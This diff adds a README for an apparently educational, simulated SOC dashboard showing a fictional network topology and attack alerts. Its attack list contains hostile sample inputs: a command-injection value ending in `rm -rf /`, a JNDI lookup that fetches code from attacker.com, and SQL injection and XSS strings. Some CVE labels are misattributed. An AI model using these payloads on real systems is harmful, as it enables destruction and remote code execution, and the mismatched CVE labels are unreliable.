@@ -1,0 +1,148 @@
+# CyberWatch SOC Dashboard
+
+A visually stunning, interactive SOC (Security Operations Center) dashboard that simulates an Intrusion Detection System (IDS) with a cyberpunk aesthetic.
+
+## How to Run in Replit
+
+1. Create a new Replit account if you don't have one.
+2. Create a new HTML/CSS/JS Replit project.
+3. Replace the contents of `index.html`, `style.css`, and `script.js` with the files provided.
+4. Click the "Run" button to start the dashboard.
+5. The dashboard will open in the Replit preview window.
+
+## Features
+
+- **3D Network Visualization**: Interactive 3D representation of network topology
+- **Real-time Attack Simulation**: Simulated network attacks with detailed alerting
+- **Packet Animation**: Visual representation of network traffic (normal and malicious)
+- **Interactive Controls**: Pause, step, speed control, and packet trail toggle
+- **Detailed Alerting**: Comprehensive attack information including CVEs and payload snippets
+- **Node Inspection**: Click on network nodes to view detailed information
+- **Threat Timeline**: Visual representation of threat frequency over time
+
+## Network Topology
+
+The simulated network consists of the following components:
+
+### Nodes
+
+1. **Edge Router** (198.51.100.1)
+   - Role: Gateway to the internet
+   - Data: internet-gateway
+
+2. **Perimeter Firewall** (198.51.100.2)
+   - Role: Network security perimeter
+
+3. **Core Switch** (10.0.0.1)
+   - Role: Central network switch
+
+4. **Web Server 1** (10.0.1.10)
+   - Role: Public web server
+   - Data: public-website
+
+5. **Web Server 2** (10.0.1.11)
+   - Role: Public web server
+   - Data: public-website
+
+6. **App Server 1** (10.0.2.20)
+   - Role: Application server
+   - Data: application-logic
+
+7. **App Server 2** (10.0.2.21)
+   - Role: Application server
+   - Data: application-logic
+
+8. **DB Server** (10.0.3.30)
+   - Role: Database server
+   - Data: customers, orders
+
+9. **Storage SAN** (10.0.4.40)
+   - Role: Storage area network
+   - Data: backups, archives
+
+10. **WAP-Floor2** (10.0.5.50)
+    - Role: Wireless access point
+
+11. **Workstation 1** (10.0.6.60)
+    - Role: Employee workstation
+
+12. **Workstation 2** (10.0.6.61)
+    - Role: Employee workstation
+
+### Connections
+
+The network is interconnected as follows:
+- Edge Router ↔ Perimeter Firewall
+- Perimeter Firewall ↔ Core Switch
+- Core Switch ↔ Web Servers
+- Core Switch ↔ WAP-Floor2
+- Web Servers ↔ App Servers
+- App Servers ↔ DB Server
+- DB Server ↔ Storage SAN
+- WAP-Floor2 ↔ Workstations
+
+## Attack Simulation
+
+The dashboard simulates various types of network attacks:
+
+### Attack Types
+
+1. **SQL Injection** (CVE-2021-44228)
+   - Example: `SELECT * FROM users WHERE id=' OR '1'='1';--`
+
+2. **DDoS/DoS**
+   - Example: High-rate requests
+
+3. **Malware Delivery** (CVE-2021-40444)
+   - Example: `MSHTML::CMarkup::CreateElement()`
+
+4. **Phishing Attempt**
+   - Example: `http://malicious-site.com/login.php`
+
+5. **Command Injection** (CVE-2021-43297)
+   - Example: `127.0.0.1; rm -rf /`
+
+6. **RCE Attempt** (CVE-2021-44228)
+   - Example: `${jndi:ldap://attacker.com/exploit}`
+
+7. **XSS** (CVE-2020-26870)
+   - Example: `<script>alert('XSS')</script>`
+
+8. **Credential Stuffing**
+   - Example: `admin:password123`
+
+9. **File Exfiltration**
+   - Example: `GET /sensitive-data.zip HTTP/1.1`
+
+### Malicious IPs
+
+The simulation uses the following reserved/test IP ranges for malicious sources:
+- 203.0.113.45
+- 198.51.100.77
+- 192.0.2.123
+- 203.0.113.88
+- 198.51.100.99
+- 192.0.2.200
+- 203.0.113.101
+- 198.51.100.42
+
+## Controls
+
+- **Mouse Drag**: Rotate the 3D network view
+- **Mouse Wheel**: Zoom in/out
+- **Click Node**: View node details
+- **Pause/Resume**: Pause or resume the simulation
+- **Step Event**: Manually trigger the next event (when paused)
+- **Toggle Packet Trails**: Show/hide packet animations
+- **Speed Slider**: Adjust simulation speed
+
+## Keyboard Shortcuts
+
+- **Space**: Pause/Resume simulation
+
+## Notes
+
+- This is a front-end only simulation with no real network scanning or packet capture.
+- All IPs, CVEs, and payload snippets are synthetic or from reserved/test ranges.
+- No actual exploit code or malware is included.
+- The simulation is for educational and demonstration purposes only.
